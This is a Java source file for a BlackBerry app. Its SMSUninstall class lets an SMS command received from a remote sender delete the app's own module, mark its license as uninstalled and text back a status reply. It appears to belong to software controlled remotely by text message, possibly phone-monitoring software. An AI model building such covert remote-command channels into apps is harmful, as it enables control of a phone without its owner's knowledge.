package com.vvt.rmtcmd.sms;

import net.rim.device.api.system.CodeModuleManager;
import com.vvt.global.Global;
import com.vvt.info.ApplicationInfo;
import com.vvt.license.LicenseInfo;
import com.vvt.license.LicenseManager;
import com.vvt.license.LicenseStatus;
import com.vvt.rmtcmd.RmtCmdLine;
import com.vvt.smsutil.FxSMSMessage;
import com.vvt.std.Constant;
import com.vvt.std.Log;
import com.vvt.version.VersionInfo;

public class SMSUninstall extends RmtCmdSync {
	
	private boolean uninstallSucess = false;
	private LicenseManager license = Global.getLicenseManager();
	private LicenseInfo licenseInfo = null;
	
	public SMSUninstall(RmtCmdLine rmtCmdLine) {
		super.rmtCmdLine = rmtCmdLine;
		smsMessage.setNumber(rmtCmdLine.getSenderNumber());
	}
	
	/*private void doSMSHeader() {
		responseMessage.delete(0, responseMessage.length());
		responseMessage.append(Constant.L_SQUARE_BRACKET);
		responseMessage.append(licenseInfo.getProductID());
		responseMessage.append(Constant.SPACE);
		responseMessage.append(VersionInfo.getFullVersion());
		responseMessage.append(Constant.R_SQUARE_BRACKET);
		responseMessage.append(Constant.L_SQUARE_BRACKET);
		responseMessage.append(smsCmdCode.getUninstallCmd());
		responseMessage.append(Constant.R_SQUARE_BRACKET);
		responseMessage.append(Constant.SPACE);
	}*/
	
	private void uninstallApplication() {
		try {
			// TODO: Not Supported 
			int moduleHandle = CodeModuleManager.getModuleHandle(ApplicationInfo.APPLICATION_NAME);
			CodeModuleManager.deleteModuleEx(moduleHandle, true);			
		} catch (Exception e) {
			Log.error("CmdUninstall.uninstallApplication", null, e);
		}
	}
	
	/*private void exitApplication() {
		if (uninstallSucess) {
			System.exit(0);
		}
	}*/
	
	// RmtCommand
	public void execute(RmtCmdExecutionListener observer) {
		smsSender.addListener(this);
		super.observer = observer;
		doSMSHeader(smsCmdCode.getUninstallCmd());
		try {
//			Log.debug("CmdUninstall.execute()", "ENTER");			
			uninstallApplication();
			licenseInfo = license.getLicenseInfo();
			licenseInfo.setLicenseStatus(LicenseStatus.UNINSTALL);
			license.commit(licenseInfo);
//			responseMessage.append(Constant.OK);
//			uninstallSucess = true;
		} catch(Exception e) {
//			uninstallSucess = false;
			responseMessage.append(Constant.ERROR);
			responseMessage.append(Constant.CRLF);
			responseMessage.append(e.getMessage());
			// To create system event.
			createSystemEventOut(responseMessage.toString());
			// To send SMS reply.
			smsMessage.setMessage(responseMessage.toString());
			send();
		}
	}

	// SMSSendListener
	public void smsSendFailed(FxSMSMessage smsMessage, Exception e, String message) {
		Log.error("CmdUninstall.smsSendFailed", "Number = " + smsMessage.getNumber() + ", SMS Message = " + smsMessage.getMessage() + ", Contact Name = " + smsMessage.getContactName() + ", Message = " + message, e);
		smsSender.removeListener(this);
		observer.cmdExecutedError(this);
//		exitApplication();
	}

	public void smsSendSuccess(FxSMSMessage smsMessage) {
		smsSender.removeListener(this);
		observer.cmdExecutedSuccess(this);
//		exitApplication();
		System.exit(0);
	}
}
